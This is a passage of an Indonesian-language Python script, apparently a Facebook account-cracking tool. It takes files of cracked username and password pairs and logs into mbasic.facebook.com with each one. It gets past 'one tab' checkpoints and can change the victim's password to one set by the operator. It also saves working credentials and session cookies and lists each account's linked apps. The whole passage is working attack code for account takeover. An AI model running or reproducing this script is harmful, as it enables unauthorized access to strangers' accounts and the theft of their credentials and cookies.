						mengecek(ngecek[0].replace(" [TIGER-OK] ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s• tidak ada koneksi "%(M)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
				input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
				pilihan().menu()
			elif c in['t','T']:
				exit()
			else:
				exit ("%s%s isi yg benar kentod "%(M,til))
	else:
		exit(f"\n{M}{til} Ops... tidak mendapatkan hasil :(")

def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
	try:
		print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s• file tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s• sandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" : ")
		nomor+=1
		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" [TIGER-OK] ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" [TIGER-OK] ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	pilihan().menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s• akun terkunci sesi new"%(M))
		else:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			
			open('OK/%s.txt'%(waktu), 'a').write(" [TIGER-OK] %s : %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s akun one tab, sandi berhasil di ubah \n [TIGER-OK] %s : %s : %s			"%(H,til,user,pwbaru[0],coki))
						
						open('OK/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s akun one tab, silahkan anda login		"%(H,til))
					
					open('OK/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s : %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s terjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• ACCOUNT CHECKPOINT NO LOGIN "%(H))
				
				open('OK/%s.txt' %(waktu), 'a').write(" [TIGER-OK] %s : %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	else:
		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
		
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	print ('');jeda(2)
	jalan (H+' √ berhasil menghapus hasil crack ');jeda(2)
	pilihan().menu()
	
def hasill():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	print ("%s%s%s 00 %sKembali "%(M,M,M,M))
	
def cek_cek(rom):
	if rom in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
	elif rom in['1','01']:
		hasil_fb()
	elif rom in['2','02']:
		hapus_hasil()
	elif rom in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
def hasil_fb():
	hasill()
	l = input('\n%s#%s HALBZHERA %s> %s '%(M,M,M,M))
	if l in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
if __name__=="__main__":
	Masuk()